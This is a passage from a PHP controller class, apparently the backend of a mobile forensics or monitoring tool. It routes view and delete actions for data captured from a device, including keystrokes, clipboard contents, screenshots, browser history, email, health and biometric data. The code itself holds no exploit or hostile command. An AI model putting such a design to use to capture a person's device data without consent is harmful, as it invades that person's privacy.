    }

    public function delete_default_apps($id)
    {
        $c = new ForensicsUserController();
        $c->initController($this->request, $this->response, $this->logger);
        return $c->delete_default_apps($id);
    }

    public function alarms()
    {
        $c = new ForensicsUserController();
        $c->initController($this->request, $this->response, $this->logger);
        return $c->alarms();
    }

    public function delete_alarms($id)
    {
        $c = new ForensicsUserController();
        $c->initController($this->request, $this->response, $this->logger);
        return $c->delete_alarms($id);
    }

    public function audio_devices()
    {
        $c = new ForensicsUserController();
        $c->initController($this->request, $this->response, $this->logger);
        return $c->audio_devices();
    }

    public function delete_audio_devices($id)
    {
        $c = new ForensicsUserController();
        $c->initController($this->request, $this->response, $this->logger);
        return $c->delete_audio_devices($id);
    }

    public function biometric()
    {
        $c = new ForensicsUserController();
        $c->initController($this->request, $this->response, $this->logger);
        return $c->biometric();
    }

    public function delete_biometric($id)
    {
        $c = new ForensicsUserController();
        $c->initController($this->request, $this->response, $this->logger);
        return $c->delete_biometric($id);
    }

    public function app_security()
    {
        $c = new ForensicsUserController();
        $c->initController($this->request, $this->response, $this->logger);
        return $c->app_security();
    }

    public function delete_app_security($id)
    {
        $c = new ForensicsUserController();
        $c->initController($this->request, $this->response, $this->logger);
        return $c->delete_app_security($id);
    }

    public function system_locale()
    {
        $c = new ForensicsUserController();
        $c->initController($this->request, $this->response, $this->logger);
        return $c->system_locale();
    }

    public function delete_system_locale($id)
    {
        $c = new ForensicsUserController();
        $c->initController($this->request, $this->response, $this->logger);
        return $c->delete_system_locale($id);
    }

    public function app_permissions()
    {
        $c = new ForensicsUserController();
        $c->initController($this->request, $this->response, $this->logger);
        return $c->app_permissions();
    }

    public function delete_app_permissions($id)
    {
        $c = new ForensicsUserController();
        $c->initController($this->request, $this->response, $this->logger);
        return $c->delete_app_permissions($id);
    }

    public function browser_history()
    {
        $c = new ForensicsUserController();
        $c->initController($this->request, $this->response, $this->logger);
        return $c->browser_history();
    }

    public function delete_browser_history($id)
    {
        $c = new ForensicsUserController();
        $c->initController($this->request, $this->response, $this->logger);
        return $c->delete_browser_history($id);
    }

    public function clipboard()
    {
        $c = new ForensicsUserController();
        $c->initController($this->request, $this->response, $this->logger);
        return $c->clipboard();
    }

    public function delete_clipboard($id)
    {
        $c = new ForensicsUserController();
        $c->initController($this->request, $this->response, $this->logger);
        return $c->delete_clipboard($id);
    }

    public function content_providers()
    {
        $c = new ForensicsUserController();
        $c->initController($this->request, $this->response, $this->logger);
        return $c->content_providers();
    }

    public function delete_content_providers($id)
    {
        $c = new ForensicsUserController();
        $c->initController($this->request, $this->response, $this->logger);
        return $c->delete_content_providers($id);
    }

    public function digital_wellbeing()
    {
        $c = new ForensicsUserController();
        $c->initController($this->request, $this->response, $this->logger);
        return $c->digital_wellbeing();
    }

    public function delete_digital_wellbeing($id)
    {
        $c = new ForensicsUserController();
        $c->initController($this->request, $this->response, $this->logger);
        return $c->delete_digital_wellbeing($id);
    }

    public function email()
    {
        $c = new ForensicsUserController();
        $c->initController($this->request, $this->response, $this->logger);
        return $c->email();
    }

    public function delete_email($id)
    {
        $c = new ForensicsUserController();
        $c->initController($this->request, $this->response, $this->logger);
        return $c->delete_email($id);
    }

    public function health_data()
    {
        $c = new ForensicsUserController();
        $c->initController($this->request, $this->response, $this->logger);
        return $c->health_data();
    }

    public function delete_health_data($id)
    {
        $c = new ForensicsUserController();
        $c->initController($this->request, $this->response, $this->logger);
        return $c->delete_health_data($id);
    }

    public function keyboard_input()
    {
        $c = new ForensicsUserController();
        $c->initController($this->request, $this->response, $this->logger);
        return $c->keyboard_input();
    }

    public function delete_keyboard_input($id)
    {
        $c = new ForensicsUserController();
        $c->initController($this->request, $this->response, $this->logger);
        return $c->delete_keyboard_input($id);
    }

    public function keyguard()
    {
        $c = new ForensicsUserController();
        $c->initController($this->request, $this->response, $this->logger);
        return $c->keyguard();
    }

    public function delete_keyguard($id)
    {
        $c = new ForensicsUserController();
        $c->initController($this->request, $this->response, $this->logger);
        return $c->delete_keyguard($id);
    }

    public function screenshots()
    {
        $c = new ForensicsUserController();
        $c->initController($this->request, $this->response, $this->logger);
        return $c->screenshots();
    }

    public function delete_screenshots($id)
    {
        $c = new ForensicsUserController();
        $c->initController($this->request, $this->response, $this->logger);
        return $c->delete_screenshots($id);
    }

    public function screen_state()
    {
        $c = new ForensicsUserController();
        $c->initController($this->request, $this->response, $this->logger);
        return $c->screen_state();
    }

    public function delete_screen_state($id)
    {
        $c = new ForensicsUserController();
        $c->initController($this->request, $this->response, $this->logger);
        return $c->delete_screen_state($id);
    }

    public function media_hardware()
    {
        $c = new ForensicsUserController();
        $c->initController($this->request, $this->response, $this->logger);
        return $c->media_hardware();
    }

    public function delete_media_hardware($id)
    {
        $c = new ForensicsUserController();
        $c->initController($this->request, $this->response, $this->logger);
        return $c->delete_media_hardware($id);
    }
}
